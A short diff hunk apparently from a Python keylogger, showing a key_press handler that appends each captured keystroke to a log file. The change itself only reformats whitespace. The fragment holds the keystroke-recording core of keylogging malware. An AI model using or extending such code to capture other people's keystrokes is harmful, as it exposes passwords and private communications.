@@ -7,7 +7,7 @@ else:
 
 def key_press(event):
 	try:
-		klog=open(logfile, 'a+')
+		klog = open(logfile, 'a+')
 		klog.write(event.Key)
 		klog.write("\n")
 
